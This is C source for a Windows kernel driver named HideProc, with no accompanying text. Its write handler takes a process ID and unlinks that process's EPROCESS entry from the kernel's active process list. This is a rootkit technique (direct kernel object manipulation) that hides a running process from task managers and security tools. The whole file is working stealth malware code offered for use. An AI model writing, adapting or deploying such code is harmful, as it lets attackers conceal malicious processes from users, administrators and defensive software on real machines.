#include <ntddk.h>
#include <ntifs.h>

typedef unsigned int UINT;
typedef int BOOL;

typedef struct _hpstruct{
	UINT uPid;
	UINT uFlinkOffset;
}hpstruct;

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
NTSTATUS HideProc_Create(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS HideProc_Write(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS HideProc_Close(PDEVICE_OBJECT DeviceObject, PIRP Irp);
VOID HideProc_Unload(PDRIVER_OBJECT  DriverObject);
NTSTATUS HideProc_Unsupported(PDEVICE_OBJECT DeviceObject, PIRP Irp);

#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, HideProc_Create) 
#pragma alloc_text(PAGE, HideProc_Write)
#pragma alloc_text(PAGE, HideProc_Close) 
#pragma alloc_text(PAGE, HideProc_Unload)
#pragma alloc_text(PAGE, HideProc_Unsupported)


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath){
	UNICODE_STRING usDriverName, usDosDeviceName;
	PDEVICE_OBJECT pDeviceObject;
	NTSTATUS ntStatus;
	UINT uiIndex;
	
	DbgPrint("HideProc DriverEntry Called\n");
	
	RtlInitUnicodeString(&usDriverName, L"\\Device\\HideProc");
	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\HideProc"); 
	
	ntStatus = IoCreateDevice(pDriverObject, 0, &usDriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	if(NT_SUCCESS(ntStatus)){
		for(uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; uiIndex++)
			pDriverObject->MajorFunction[uiIndex]	= HideProc_Unsupported;
		pDriverObject->MajorFunction[IRP_MJ_CREATE]	= HideProc_Create;
		pDriverObject->MajorFunction[IRP_MJ_WRITE]	= HideProc_Write;
		pDriverObject->MajorFunction[IRP_MJ_CLOSE]	= HideProc_Close;
		pDriverObject->DriverUnload			= HideProc_Unload; 
		pDeviceObject->Flags |= DO_DIRECT_IO;
		pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
		IoCreateSymbolicLink(&usDosDeviceName, &usDriverName);
	}
	
	return ntStatus;
}

NTSTATUS HideProc_Create(PDEVICE_OBJECT DeviceObject, PIRP Irp){
	NTSTATUS NtStatus = STATUS_SUCCESS;
	DbgPrint("HideProc_Create Called\n");
	return NtStatus;
}

NTSTATUS HideProc_Write(PDEVICE_OBJECT DeviceObject, PIRP Irp){
	NTSTATUS NtStatus = STATUS_INVALID_PARAMETER;
	PIO_STACK_LOCATION pIoStackIrp = NULL;
	UINT dwDataWritten = 0;
	ULONG dwEProcAddr;
	PLIST_ENTRY pListProcs;
	PEPROCESS pEProc;
	
	hpstruct *hps;
	
	DbgPrint("HideProc_Write Called\n");
	pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);
	
	if(pIoStackIrp && Irp->MdlAddress){
		hps = (hpstruct *)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
		if(hps){
			if(pIoStackIrp->Parameters.Write.Length == sizeof(hpstruct)){
				if(PsLookupProcessByProcessId((PVOID)hps->uPid, &pEProc) == STATUS_SUCCESS){
					DbgPrint("EPROCESS found. Address: %08lX.\n", pEProc);
					DbgPrint("Now hiding process %d...\n", hps->uPid);
					dwEProcAddr = (ULONG) pEProc;
					__try{
						pListProcs = (PLIST_ENTRY) (dwEProcAddr + hps->uFlinkOffset);
						*((ULONG*) pListProcs->Blink) = (ULONG) (pListProcs->Flink);   //set flink of prev proc to flink of cur proc
						*((ULONG*) pListProcs->Flink+1) = (ULONG) (pListProcs->Blink); //set blink of next proc to blink of cur proc
						pListProcs->Flink = (PLIST_ENTRY) &(pListProcs->Flink); //set flink and blink of cur proc to themselves
						pListProcs->Blink = (PLIST_ENTRY) &(pListProcs->Flink); //otherwise might bsod when exiting process
						DbgPrint("Process now hidden.\n");
					}__except(EXCEPTION_EXECUTE_HANDLER){
						NtStatus = GetExceptionCode();
						DbgPrint("Exception: %d.\n", NtStatus);
					}
					NtStatus = STATUS_SUCCESS;
				}
			}else{
				NtStatus = STATUS_BUFFER_TOO_SMALL;
			}
			dwDataWritten = sizeof(hpstruct);
		}
	}
	
	Irp->IoStatus.Status = NtStatus;
	Irp->IoStatus.Information = dwDataWritten;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return NtStatus;
}

NTSTATUS HideProc_Close(PDEVICE_OBJECT DeviceObject, PIRP Irp){
	NTSTATUS NtStatus = STATUS_SUCCESS;
	DbgPrint("HideProc_Close Called\n");
	return NtStatus;
}

VOID HideProc_Unload(PDRIVER_OBJECT  DriverObject){
	UNICODE_STRING usDosDeviceName;
	DbgPrint("HideProc_Unload Called\n");
	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\HideProc");
	IoDeleteSymbolicLink(&usDosDeviceName);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS HideProc_Unsupported(PDEVICE_OBJECT DeviceObject, PIRP Irp){
	NTSTATUS NtStatus = STATUS_NOT_SUPPORTED;
	DbgPrint("HideProc_Unsupported Called\n");
	return NtStatus;
}